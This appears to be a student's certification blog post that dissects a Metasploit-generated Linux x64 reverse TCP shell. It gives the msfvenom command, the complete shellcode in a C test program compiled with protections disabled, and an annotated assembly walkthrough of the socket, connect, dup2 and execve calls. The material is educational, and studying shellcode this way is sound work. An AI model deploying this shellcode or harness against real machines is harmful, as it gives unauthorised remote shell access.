# Reverse Tcp Shell
I created the payload like this:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
```
LHOST and LPORT specify the IP and port to connect to

## Testmodule
As I did for the first analysed payload I placed the shellcode into a C programm:
```
unsigned char shellcode[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

(*(void(*)()) shellcode)();

```

And compiled it like this:
```
gcc -m64 -z execstack -fno-stack-protector Test.c -o Test -no-pie
```

## Analysis

1. Create a new socket by socket(AF_INET, SOCK_STREAM, 0)

    ```
    push 0x29   ; SYS_SOCKET
    pop rax
    cdq         ; Clear RDX
    push   0x2  ; AF_INET
    pop    rdi
    push   0x1  ; SOCK_STREAM
    pop    rsi
    syscall
    xchg   rdi,rax ; Place returned fd in rdi
    ```

2. Create struct_sockaddr

    ```
    movabs rcx,0x100007f5c110002 ; Struct with ip, port and sin_family. All in one
    push   rcx
    mov    rsi,rsp ; rsi now points to the struct
    push   0x10 ; Size of struct
    pop    rdx
    push 0x2a ; SYS_CONNECT
    pop rax
    syscall
    ```

3. Dup2 loop

    ```
    push   0x3
    pop    rsi
    dec    rsi ; start with stderr (2)
    push   0x21 ; dup2
    pop    rax
    syscall

    loop:

        dec    rsi
        push   0x21 ; dup2
        pop    rax
        syscall
        jne    loop

    ```


4. Execve syscall .

    ```
    push   0x3b # SYS_EXECVE
    pop    rax
    cdq
    movabs rbx,0x68732f6e69622f ; rbx has /bin/sh in hex
    push   rbx
    mov    rdi,rsp ; rdi points to /bin/sh
    push   rdx
    push   rdi
    mov    rsi,rsp ; rsi points to a pointer to /bin/sh and works as argv**
    syscall ; execve("/bin/sh", ["/bin/sh"], 0);

    ```
    
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
